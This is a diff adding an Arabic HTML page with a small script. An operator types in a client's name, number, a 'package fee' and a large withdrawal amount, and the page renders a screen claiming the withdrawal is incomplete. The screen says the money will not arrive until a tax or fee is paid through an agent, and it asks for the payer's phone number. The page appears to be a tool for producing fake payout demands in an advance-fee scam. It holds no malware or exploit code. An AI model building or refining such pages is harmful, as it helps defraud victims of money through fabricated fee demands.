@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>سحب</title>
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background:#08131f;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+}
+
+.container{
+    width:420px;
+    background:#1b2b40;
+    border-radius:25px;
+    padding:25px;
+    box-shadow:0 0 25px #00eaff66;
+    border:2px solid #00eaff55;
+    color:white;
+}
+
+.title{
+    text-align:center;
+    color:#ff5c5c;
+    font-size:22px;
+    margin-bottom:10px;
+}
+
+.desc{
+    text-align:center;
+    line-height:1.6;
+    font-size:15px;
+}
+
+.highlight{
+    color:#00f2ff;
+    font-weight:bold;
+}
+
+.warning{
+    color:#ff5c5c;
+    margin-top:10px;
+    text-align:center;
+    font-size:14px;
+}
+
+.card{
+    background:#24384f;
+    margin-top:20px;
+    padding:15px;
+    border-radius:15px;
+}
+
+.row{
+    margin:8px 0;
+}
+
+.label{
+    color:#ccc;
+}
+
+.value{
+    color:#00f2ff;
+    font-weight:bold;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:10px;
+    margin-top:10px;
+    background:#0f1c2b;
+    color:white;
+    font-size:16px;
+}
+
+button{
+    width:100%;
+    margin-top:15px;
+    padding:12px;
+    border:none;
+    border-radius:12px;
+    background:#00cfd5;
+    font-size:18px;
+    font-weight:bold;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- مدخلات التحكم -->
+    <input type="text" id="clientName" placeholder="اسم العميل">
+    <input type="text" id="clientNumber" placeholder="رقم العميل">
+    <input type="number" id="packageFees" placeholder="رسوم الباقة">
+    <input type="number" id="withdrawAmount" placeholder="مبلغ السحب (مثال 90000)">
+
+    <button onclick="generate()">عرض صفحة السحب</button>
+
+    <!-- نتيجة -->
+    <div id="result" style="display:none;">
+
+        <div class="title">
+            عذراً عملية السحب غير مكتملة
+        </div>
+
+        <div class="desc">
+            لإتمام سحب مبلغ 
+            <span class="highlight" id="amountText"></span>
+            ج.م برجاء دفع الضريبة أولاً لتأكيد عملية السحب
+        </div>
+
+        <div class="warning">
+            تنبيه: لم يصلك مبلغ السحب إذا لم يتم دفع الرسوم المطلوبة
+            <br>
+            (الرسوم تسدد للمنصة وعبر الوكيل)
+        </div>
+
+        <div class="card">
+            <div class="row">
+                <span class="label">اسم العميل:</span>
+                <span class="value" id="rName"></span>
+            </div>
+
+            <div class="row">
+                <span class="label">رقم العميل:</span>
+                <span id="rNumber"></span>
+            </div>
+
+            <div class="row">
+                <span class="label">رسوم الباقة:</span>
+                <span class="value" id="rFees"></span>
+            </div>
+
+            <div class="row">
+                <span class="label">رقم الهاتف الذي سدد منه الرسوم:</span>
+                <input type="text" placeholder="ادخل الرقم">
+            </div>
+        </div>
+
+        <button>تم</button>
+
+    </div>
+
+</div>
+
+<script>
+function generate(){
+
+    var name = document.getElementById("clientName").value;
+    var number = document.getElementById("clientNumber").value;
+    var fees = document.getElementById("packageFees").value;
+    var amount = document.getElementById("withdrawAmount").value;
+
+    if(name=="" || number=="" || fees=="" || amount==""){
+        alert("من فضلك املأ كل البيانات");
+        return;
+    }
+
+    document.getElementById("rName").innerText = name;
+    document.getElementById("rNumber").innerText = number;
+    document.getElementById("rFees").innerText = fees + " ج.م";
+    document.getElementById("amountText").innerText = amount;
+
+    document.getElementById("result").style.display="block";
+}
+</script>
+
+</body>
+</html>
